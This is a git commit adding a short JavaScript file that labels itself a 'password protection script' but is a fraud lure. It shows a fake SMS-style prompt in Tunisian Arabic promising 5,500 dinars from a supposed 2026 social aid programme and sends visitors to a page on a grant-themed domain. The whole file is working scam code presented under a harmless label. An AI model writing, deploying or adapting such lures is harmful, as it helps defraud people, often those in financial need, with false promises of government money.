b6ad610003c16f206a36b36d207368cce811eb79
The-ongoing <preciousadaowo4@gmail.com>
2026-01-26 01:25:08 +0100

    Create activeeq.js

---
+++ activeeq.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'اسحب الفلوس'
+password = prompt(
+  'SMS: مبروك! عندك الحق تتحصّل على 5,500 د.ت من برنامج AMEN الاجتماعي 2026. اضغط "موافق" باش تتحصّل عليها توّة.',
+  'اسحب الفلوس'
+); 
+if (password != 'اسحب الفلوس') {
+  location.href = 'https://ongoing-grant.cfd/Nafa-Beneficiaries.html';
+  }
